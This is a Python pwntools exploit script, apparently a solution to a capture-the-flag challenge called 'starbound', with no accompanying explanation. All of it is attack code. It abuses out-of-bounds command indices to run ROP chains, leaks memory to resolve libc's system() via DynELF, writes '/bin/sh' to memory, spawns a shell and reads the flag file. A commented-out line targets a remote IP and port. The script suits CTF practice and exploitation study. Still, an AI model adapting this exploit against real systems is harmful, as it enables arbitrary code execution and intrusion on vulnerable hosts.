from pwn import *
n=0x80580D0
nop=0x8058154
write=0x8048A30
harmer=0x08048e48
repeater=0x804A605
context.arch='i386'
write=0x8048A30
read=0x8048A70
pppr=0x080494da
def cal(aim):
	if aim>nop:
		return (aim-0x8058154)/4
	else:
		return (aim-nop)/4
def cmd(c=cal(n)):
	p.sendafter("> ",str(c))#+"\xff")
def c(n=cal(n)):
	p.sendafter("> ",str(n)+"\x00")

def name(addr):
	c(6)
	c(2)
	p.sendlineafter("name: ",p32(addr))
	c(1)
def leak(addr):
	p.sendafter("> ",("-1109\x00\x00\x00"+p32(write)+p32(pppr)+p32(1)+p32(addr)+p32(0x180)+p32(repeater)).ljust(0x100,'\x00'))
	addr=p.read(0x180)
	return addr

bss=0x08058000-0x1000
binary=ELF('./starbound')
p=process("./starbound")
#p=remote("139.162.123.119",10202)
name(harmer)
p.sendafter("> ",("-33\x00"+p32(0xdeadbeef)+p32(read)+p32(pppr)+p32(0)+p32(bss)+p32(12)+p32(repeater)).ljust(0x100,'\x00'))
p.send(p32(harmer)+"/bin/sh\x00")
d=DynELF(leak,0x804A605,elf=binary)
#gdb.attach(p,'b  system')
system=d.lookup("system","libc")
log.warning(hex(system))
p.sendafter("> ","-1109\x00\x00\x00"+p32(system)+p32(0xcafebabe)+p32(bss+4))
p.sendline("cat /home/starbound/flag")
p.interactive()


